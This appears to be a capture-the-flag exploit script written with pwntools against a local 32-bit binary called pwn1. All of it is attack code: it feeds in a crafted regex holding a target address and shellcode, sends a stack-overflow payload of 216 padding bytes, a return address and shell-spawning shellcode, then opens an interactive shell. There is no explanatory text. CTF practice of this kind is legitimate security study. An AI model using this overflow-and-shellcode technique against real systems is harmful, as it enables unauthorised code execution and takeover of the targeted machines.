# @Author    : t1an5t

from pwn import *
context.log_level = "debug"
import string

sh = process("./pwn1")


context.arch = "i386"
context.os = "linux"
shellcode = asm(shellcraft.sh())
shell_addr = 0x0804a634 + 8*100+1

regex = ":a" + p32(shell_addr) + "$+"
regex += " "+shellcode

sh.recvuntil("format\n")
sh.sendline(regex)

payload = "Before uuuu it, understan it firf."
payload += "a"*216
payload += p32(shell_addr)
payload += " "
payload += shellcode

#gdb.attach(sh, "b *0x8048e40")
sh.recvuntil("to match\n")
sh.sendline(payload)

sh.recv()
sh.sendline("")
sh.interactive()
